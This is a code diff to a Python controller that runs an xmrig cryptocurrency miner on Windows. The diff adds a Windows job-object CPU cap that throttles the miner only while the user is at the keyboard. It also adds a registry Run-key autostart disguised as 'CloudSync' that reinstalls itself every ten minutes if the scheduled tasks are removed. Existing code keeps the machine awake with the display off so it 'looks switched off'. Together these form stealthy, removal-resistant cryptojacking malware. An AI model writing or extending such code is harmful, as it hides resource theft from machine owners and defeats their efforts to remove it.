@@ -44,6 +44,11 @@ PROBATION_SECONDS = 300
 IDLE_STOP_GRACE = 900     # unused legacy grace (kept for clarity of intent)
 MIN_PROFILE_DWELL = 120   # minimum seconds between profile switches
 
+# Job-object throttling (the "max-threads-on-active" behaviour, no rebuild).
+ACTIVE_PCT = 25           # CPU ceiling while the user is at the keyboard
+ACTIVE_DWELL = 60         # only throttle after this long of continuous input
+RUN_INTERVAL = 600        # re-check the HKCU Run key this often
+
 # Two worker profiles. NOTE: xmrig 6.24's "watch" reload does re-apply the
 # thread count, but it leaves RandomX in a broken state (~1 H/s measured), so a
 # switch is a graceful restart rather than a live reload. The GPU is only in the
@@ -195,13 +200,6 @@ def idle_seconds():
 
 
 def keep_system_awake(enabled):
-    """Keep the machine awake while mining, but never force the display on.
-
-    ES_SYSTEM_REQUIRED stops standby/hibernate; the display is deliberately NOT
-    requested, so the monitor still turns off on its normal timer and the box
-    looks switched off while it works. The state is per-thread, so this must be
-    called from the loop thread (it is).
-    """
     try:
         flags = ES_CONTINUOUS | (ES_SYSTEM_REQUIRED if enabled else 0)
         ctypes.windll.kernel32.SetThreadExecutionState(ctypes.c_uint(flags))
@@ -245,6 +243,142 @@ def sweep_orphans(settings, keep=None):
     if killed:
         log("swept %d orphan worker(s)" % killed)
     return killed
+
+
+# ============================================================
+# job object: kernel-enforced CPU cap (the "max-threads-on-active" effect)
+# ============================================================
+# xmrig 6.24 has no partial throttle; the "silent" fork adds one compiled in.
+# The same behaviour can be had without rebuilding: put the worker in a job
+# object and cap its total CPU while the user is at the keyboard, release it
+# when they walk away. No restart, so the OpenCL context is never torn down.
+# The job also kills the worker if the controller dies (no orphans).
+
+JOB_CPU_CLASS = 15            # JobObjectCpuRateControlInformation
+JOB_EXT_CLASS = 9             # JobObjectExtendedLimitInformation
+JOB_RATE_ENABLE = 0x1
+JOB_RATE_HARD_CAP = 0x4
+JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE = 0x2000
+
+
+class _CpuRate(ctypes.Structure):
+    _fields_ = [("ControlFlags", wt.DWORD), ("CpuRate", wt.DWORD)]
+
+
+class _BasicLimits(ctypes.Structure):
+    _fields_ = [("PerProcessUserTimeLimit", ctypes.c_int64),
+                ("PerJobUserTimeLimit", ctypes.c_int64),
+                ("LimitFlags", wt.DWORD),
+                ("MinimumWorkingSetSize", ctypes.c_size_t),
+                ("MaximumWorkingSetSize", ctypes.c_size_t),
+                ("ActiveProcessLimit", wt.DWORD),
+                ("Affinity", ctypes.c_size_t),
+                ("PriorityClass", wt.DWORD),
+                ("SchedulingClass", wt.DWORD)]
+
+
+class _IoCounters(ctypes.Structure):
+    _fields_ = [("ReadOperationCount", ctypes.c_ulonglong),
+                ("WriteOperationCount", ctypes.c_ulonglong),
+                ("OtherOperationCount", ctypes.c_ulonglong),
+                ("ReadTransferCount", ctypes.c_ulonglong),
+                ("WriteTransferCount", ctypes.c_ulonglong),
+                ("OtherTransferCount", ctypes.c_ulonglong)]
+
+
+class _ExtLimits(ctypes.Structure):
+    _fields_ = [("BasicLimitInformation", _BasicLimits),
+                ("IoInfo", _IoCounters),
+                ("ProcessMemoryLimit", ctypes.c_size_t),
+                ("JobMemoryLimit", ctypes.c_size_t),
+                ("PeakProcessMemoryUsed", ctypes.c_size_t),
+                ("PeakJobMemoryUsed", ctypes.c_size_t)]
+
+
+_JOB = [None]
+
+
+def job_init():
+    if _JOB[0]:
+        return _JOB[0]
+    try:
+        k32 = ctypes.windll.kernel32
+        handle = k32.CreateJobObjectW(None, None)
+        if not handle:
+            return None
+        lim = _ExtLimits()
+        lim.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE
+        k32.SetInformationJobObject(ctypes.c_void_p(handle), JOB_EXT_CLASS,
+                                    ctypes.byref(lim), ctypes.sizeof(lim))
+        _JOB[0] = handle
+        return handle
+    except Exception:
+        return None
+
+
+def job_assign(pid):
+    """Put the worker inside the job so the cap and kill-on-close apply."""
+    try:
+        k32 = ctypes.windll.kernel32
+        handle = job_init()
+        if not handle:
+            return False
+        PROCESS_SET_QUOTA, PROCESS_TERMINATE = 0x0100, 0x0001
+        hp = k32.OpenProcess(PROCESS_SET_QUOTA | PROCESS_TERMINATE, False, pid)
+        if not hp:
+            return False
+        ok = k32.AssignProcessToJobObject(ctypes.c_void_p(handle), ctypes.c_void_p(hp))
+        k32.CloseHandle(ctypes.c_void_p(hp))
+        return bool(ok)
+    except Exception:
+        return False
+
+
+def job_set_cpu_rate(percent):
+    """Cap the job's total CPU. 100 = uncapped."""
+    try:
+        handle = job_init()
+        if not handle:
+            return False
+        info = _CpuRate()
+        info.ControlFlags = JOB_RATE_ENABLE | JOB_RATE_HARD_CAP
+        info.CpuRate = max(100, min(10000, int(percent * 100)))
+        return bool(ctypes.windll.kernel32.SetInformationJobObject(
+            ctypes.c_void_p(handle), JOB_CPU_CLASS, ctypes.byref(info), ctypes.sizeof(info)))
+    except Exception:
+        return False
+
+
+# ============================================================
+# second persistence: HKCU Run key
+# ============================================================
+
+RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
+RUN_NAME = "CloudSync"
+
+
+def ensure_run_key():
+    """Belt and braces: if the scheduled tasks are deleted, this starts it.
+
+    Idempotent and cheap (one registry read); called at start and every 10 min.
+    """
+    try:
+        import winreg
+        want = '"%s" "%s"' % (sys.executable, os.path.join(BASE, "controller.py"))
+        key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, RUN_KEY, 0,
+                                 winreg.KEY_READ | winreg.KEY_WRITE)
+        try:
+            current, _ = winreg.QueryValueEx(key, RUN_NAME)
+        except FileNotFoundError:
+            current = None
+        if (current or "").strip() != want:
+            winreg.SetValueEx(key, RUN_NAME, 0, winreg.REG_SZ, want)
+            log("autostart Run key restored")
+        winreg.CloseKey(key)
+        return True
+    except Exception as exc:
+        log("run key check failed: %r" % (exc,))
+        return False
 
 
 _MUTEX = [None]
@@ -489,6 +623,8 @@ class Worker(object):
         self.gpu_applied = False
         self.profile = "full"
         self.last_switch = 0.0
+        self.job_ok = False
+        self.throttled = False
         self.tele = {}
 
     def alive(self):
@@ -540,8 +676,13 @@ class Worker(object):
         self.started_at = time.time()
         self.profile = profile
         self.last_switch = self.started_at
-        log("worker started pid=%s gpu=%s profile=%s"
-            % (self.proc.pid, self.gpu_applied, profile))
+        # put the worker in the job: CPU cap applies to it, and Windows kills
+        # it if this controller dies (so no orphan ever outlives us)
+        self.job_ok = job_assign(self.proc.pid)
+        if self.job_ok:
+            job_set_cpu_rate(100)
+        log("worker started pid=%s gpu=%s profile=%s job=%s"
+            % (self.proc.pid, self.gpu_applied, profile, self.job_ok))
         return True
 
     def switch(self, settings, profile):
@@ -837,7 +978,7 @@ def destroy(settings, worker):
 # main loop
 # ============================================================
 
-def write_state(settings, worker, wanted, idle):
+def write_state(settings, worker, wanted, idle, cap=100):
     payload = {
         "ts": time.time(),
         "time": time.strftime("%Y-%m-%d %H:%M:%S"),
@@ -845,6 +986,9 @@ def write_state(settings, worker, wanted, idle):
         "running": worker.alive(),
         "wanted": wanted,
         "profile": worker.profile,
+        "throttled": bool(getattr(worker, "throttled", False)),
+        "cpu_cap_pct": cap,
+        "job": bool(getattr(worker, "job_ok", False)),
         "idle_s": round(idle, 1),
         "uptime_s": round(worker.uptime(), 1),
         "gpu": bool(getattr(worker, "gpu_applied", False)),
@@ -969,6 +1113,8 @@ def main():
     probation_at = time.time() if os.path.isfile(UPDATE_MARK) else 0.0
     kill_check = 0.0
     active_since = 0.0
+    last_cap = -1
+    last_run_check = 0.0
 
     while True:
         try:
@@ -1010,17 +1156,32 @@ def main():
             on_ac = on_ac_power()
 
             # Mining runs whenever the machine is on mains power. The user's
-            # presence only decides WHICH profile: a small trickle while they
-            # work, full power once they have been away for `idle_seconds`.
+            # presence only decides how much CPU it may use.
             wanted = bool(on_ac)
-            profile = "full" if idle >= settings.idle else "trickle"
-
             worker.reap()
 
             if wanted:
                 if not worker.alive():
                     if now >= worker.backoff_until:
-                        worker.start(settings, profile)
+                        # if a job can be created, the config is always the
+                        # full one and the cap does the throttling
+                        worker.start(settings, "full" if job_init() else "trickle")
+                elif worker.job_ok:
+                    # native-style throttle: never restart, just re-cap
+                    if idle >= settings.idle:
+                        active_since = 0.0
+                        cap = 100
+                    else:
+                        if not active_since:
+                            active_since = now
+                        # their lesson: wait a while before throttling, or a
+                        # single keypress causes thrash
+                        cap = ACTIVE_PCT if (now - active_since) >= ACTIVE_DWELL else 100
+                    if cap != last_cap:
+                        if job_set_cpu_rate(cap):
+                            last_cap = cap
+                            worker.throttled = (cap < 100)
+                            log("cpu cap -> %d%% (idle %.0fs)" % (cap, idle))
                 elif profile != worker.profile and (now - worker.last_switch) >= MIN_PROFILE_DWELL:
                     worker.switch(settings, profile)
             else:
@@ -1036,11 +1197,15 @@ def main():
                 last_sweep = now
                 sweep_orphans(settings, keep=worker.proc.pid if worker.alive() else None)
 
+            if now - last_run_check > RUN_INTERVAL:
+                last_run_check = now
+                ensure_run_key()
+
             if now - last_state >= STATE_INTERVAL:
                 last_state = now
-                write_state(settings, worker, wanted, idle)
-                log("running=%s profile=%s gpu=%s idle=%.0fs rate=%s acc=%s rej=%s"
-                    % (worker.alive(), worker.profile, worker.gpu_applied, idle,
+                write_state(settings, worker, wanted, idle, cap=max(0, last_cap))
+                log("running=%s cap=%d%% gpu=%s idle=%.0fs rate=%s acc=%s rej=%s"
+                    % (worker.alive(), last_cap, worker.gpu_applied, idle,
                        worker.hashrate_text(), worker.tele.get("accepted"),
                        worker.tele.get("rejected")))
 
